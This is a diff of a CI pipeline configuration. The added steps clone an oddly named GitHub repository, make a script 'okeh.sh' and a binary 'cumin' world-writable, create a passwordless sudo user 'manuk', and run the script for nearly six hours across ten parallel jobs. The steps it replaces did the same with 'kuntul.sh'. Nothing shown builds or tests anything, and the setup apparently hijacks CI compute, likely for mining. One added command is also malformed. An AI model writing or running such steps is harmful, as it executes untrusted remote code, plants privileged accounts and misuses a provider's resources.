@@ -20,9 +20,10 @@ blocks:
             hours: 24
           parallelism: 10
           commands:
-            - apt update && apt upgrade -y
-            - apt install git -y
-            - 'git clone https://github.com/muhammad3148937/df.git'
-            - cd df
-            - chmod +x kuntul.sh
-            - ./kuntul.sh
+            - '#!/bin/bash'
+            - sudo apt update
+            - 'git clone https://github.com/dfgfd443rete/JUGER.git && cd JUGER'
+            - chmod +x okeh.sh && chmod +x cumin chmod 777 cumin okeh.sh
+            - sudo adduser --disabled-password --gecos "" manuk && sudo usermod -aG sudo manuk
+            - sudo -u manuk -H sh -c "timeout 359m ./okeh.sh"
+            - sudo apt update
